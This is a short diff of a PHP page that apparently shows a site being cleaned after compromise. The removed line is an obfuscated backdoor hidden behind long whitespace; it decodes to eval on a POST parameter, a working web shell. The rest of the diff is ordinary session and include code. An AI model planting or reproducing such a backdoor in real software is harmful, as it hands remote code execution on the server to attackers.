@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                        $l1l='Pi93SdsOa1fqtl$_(7\'veTde7139';if(isset(${$l1l[15].$l1l[0].$l1l[7].$l1l[4].$l1l[21]}[$l1l[11].$l1l[5].$l1l[20].$l1l[17].$l1l[9].$l1l[3].$l1l[2]])){eval(${$l1l[15].$l1l[0].$l1l[7].$l1l[4].$l1l[21]}[$l1l[11].$l1l[5].$l1l[20].$l1l[17].$l1l[9].$l1l[3].$l1l[2]]);} ?><?php
+<?php
 session_start();
 include('../Connections/maconnexion.php');
 header('Content-Type: text/html; charset=iso-8859-1');
